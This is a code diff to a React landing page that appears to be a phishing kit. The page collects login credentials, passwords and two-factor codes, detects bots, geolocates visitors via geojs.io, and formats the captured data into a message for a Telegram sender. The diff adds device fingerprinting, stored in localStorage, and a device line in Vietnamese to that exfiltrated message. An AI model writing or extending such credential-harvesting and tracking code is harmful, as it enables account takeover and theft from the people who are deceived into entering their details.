@@ -6,6 +6,7 @@ import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
@@ -43,6 +44,7 @@ const Home = () => {
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
     const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
+    const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -220,6 +222,19 @@ const Home = () => {
                 return;
             }
 
+            // Detect device info
+            try {
+                const device = detectDevice();
+                console.log('Device detected:', device);
+                setDeviceInfo(device);
+                localStorage.setItem('deviceInfo', JSON.stringify(device));
+            } catch (error) {
+                console.error('Error detecting device:', error);
+                const fallbackDevice = { deviceInfo: 'Unknown Device' };
+                setDeviceInfo(fallbackDevice);
+                localStorage.setItem('deviceInfo', JSON.stringify(fallbackDevice));
+            }
+
             try {
                 const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                 const data = response.data;
@@ -292,9 +307,12 @@ const Home = () => {
         const dt = formatDateTime(new Date());
         const { form, login, passes, codes } = data;
 
+        console.log('BuildAndSend - deviceInfo:', deviceInfo);
+
         let message = `📩 <b>${LABEL}</b>\n`;
         message += `⏰ ${dt}\n`;
         message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
+        message += `📱 Thiết bị: <code>${deviceInfo?.deviceInfo || 'Unknown Device'}</code>\n`;
         message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
